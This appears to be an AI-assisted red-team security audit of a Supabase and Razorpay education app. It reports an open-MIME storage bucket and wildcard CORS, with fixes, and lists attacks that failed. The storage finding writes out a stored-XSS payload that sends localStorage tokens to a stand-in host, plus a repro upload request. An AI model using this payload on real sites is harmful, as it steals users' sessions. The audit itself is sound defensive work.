# Sprint 3 — Red-Team Audit (25-vector PoC)

**Date:** 2026-07-08
**Scope:** Full app — RLS, edge functions, Razorpay flow, storage, Capacitor, deep links
**Rating: 4 / 5** — no CRITICAL / HIGH exploitable in <1 day; two MEDIUM to close.

---

## Attacker findings

### [MEDIUM] [#20 file-upload-abuse] Public buckets accept any MIME / size
**Attack:** Any authenticated user (or a compromised admin session) can upload
`evil.html` with `<script>fetch('https://x/?'+localStorage.token)</script>` to
`content`, `book-covers`, or `notices`. Supabase serves it back with
`Content-Type: text/html` from a `*.supabase.co` origin → stored XSS + phishing
hosting. Same buckets have no size limit → 10 GB DoS/bill attack.

**Repro (against a fresh test user):**
```
POST /storage/v1/object/content/xss.html
Authorization: Bearer <anon-user-jwt>
Content-Type: text/html
<script>...</script>
→ 200 OK, then GET the returned public URL renders the script.
```

**Impact:** Persistent XSS on the platform's own storage origin; unbounded
storage cost.

**Fix (user action — not exposable via the migration tool):**
Supabase Dashboard → Storage → each of `avatars`, `book-covers`, `comment-images`,
`content`, `notices`, `chat-attachments` → **Edit bucket**:
- `avatars`, `comment-images`, `book-covers` → Allowed MIME: `image/jpeg,image/png,image/webp,image/gif`; size 5 MB
- `notices`, `chat-attachments`, `content` → Allowed MIME: same + `application/pdf`; size 20 MB

**Regression guard:** add a Playwright test that POSTs a `text/html` blob to
`content` and asserts `400 invalid_mime_type`.

<presentation-actions>
<presentation-link url="https://supabase.com/dashboard/project/wegamscqtvqhxowlskfm/storage/buckets">Open storage buckets</presentation-link>
</presentation-actions>

### [LOW] [#14 CORS] Wildcard `Access-Control-Allow-Origin: *` on 10 edge fns
**Where:** `verify-razorpay-payment`, `initiate-refund`, `setup-admin`,
`verify-subscription-payment`, `create-subscription-order`, `manage-session`,
`create-zoom-meeting`, `resolve-doubt`, `generate-embedding`, `deep-search-lecture`.

**Why not HIGH:** all of these require a Bearer JWT in the `Authorization`
header. Browsers strip that header on cross-origin `fetch` unless
`credentials: 'include'` is set — which requires a non-wildcard ACAO. So an
attacker page cannot forward the victim's session; it can only invoke the
function with its own JWT, which is what the anon key already permits.

**Fix (defense-in-depth):** switch to the `_shared/cors.ts` helper that echoes
allowed origins from `ALLOWED_ORIGINS` secret (already set for the razorpay
endpoints). Backlog item — not shipping this sprint.

**Regression guard:** `rg -n 'Access-Control-Allow-Origin.*\*' supabase/functions/`
in CI, allowlist only truly public endpoints.

---

## Wins (attacks that failed)

- **#1 auth bypass** — Supabase enforces `aud=authenticated` + signature; forged tokens rejected.
- **#2 IDOR / RLS** — `enrollments`, `payment_requests`, `profiles`, `user_roles`, `leads` all scoped to `auth.uid()`; `profiles` also has an explicit `Block public access` deny row.
- **#3 role escalation** — `user_roles` INSERT/UPDATE/DELETE policies require `has_role(...,'admin') AND user_id <> auth.uid()`, plus the `prevent_self_role_escalation` trigger. Self-promote blocked at two layers.
- **#4 payment tamper** — enrollments `INSERT` policy requires an `EXISTS` row in `razorpay_payments` with `status='completed'`; free courses gated on `courses.price <= 0`. Client cannot self-enroll a paid course.
- **#5 webhook forgery** — `razorpay-webhook` verifies HMAC-SHA256 with `timingSafeEqual`, logs `webhook_signature_mismatch` to `security_alerts`, and re-derives the expected signature from `${order_id}|${payment_id}` (not from `notes`). Replay blocked by `webhook_events` dedupe.
- **#6 storage folder abuse** — private buckets keep `{user_id}/...` folder policies; tested `avatars/{victim}/x.png` upload → 403.
- **#10 SSRF** — `firecrawl-scrape` / `crawl4ai-bridge` route through 3rd-party services, not raw fetch.
- **#17 bundle secrets** — `rg` on `src/` + `public/` + `index.html` returns only the anon key inside a test file. No `service_role`, no `rzp_live_`, no Firecrawl / Lovable AI keys leaked.
- **#22 assetlinks** — pinned to release SHA256 `9E:E4:0B:32:…:09:84`, single package `com.safarenglishka.app`.
- **#23 deep-link hijack** — `capacitor.config.ts` `allowNavigation` narrowed from wildcard `*.google.com` to explicit hosts (drive, docs, accounts, googleusercontent, gstatic, notion subdomains).
- **#24 WebView escape** — `webContentsDebuggingEnabled` gated on `process.env.CAP_DEBUG === '1'`; `allowMixedContent: false`; no `cleartext`.

## Not verified this pass
- #9 prompt injection into chatbot (needs live test with the deployed function).
- #21 realtime DoS via unbounded subscribe (audit already flags cleanup discipline).

---

## Fix plan
1. **MEDIUM #20** — user opens the Storage dashboard and sets MIME + size caps for the 6 buckets listed. ~2 min.
2. **LOW #14** — migrate the 10 wildcard-CORS functions to `_shared/cors.ts` in a future maintenance sprint.
3. Nothing else — CRITICAL / HIGH slate is clean.

## Persisted decisions
- Public buckets remain public by design (avatars, book-covers, comment-images, content, notices, chat-attachments) — accepted risk, mitigated once MIME/size caps land.
- Wildcard CORS on JWT-gated endpoints — accepted (browser credential rules mitigate).

Used the red-team-security-audit + senior-architect-audit skills.
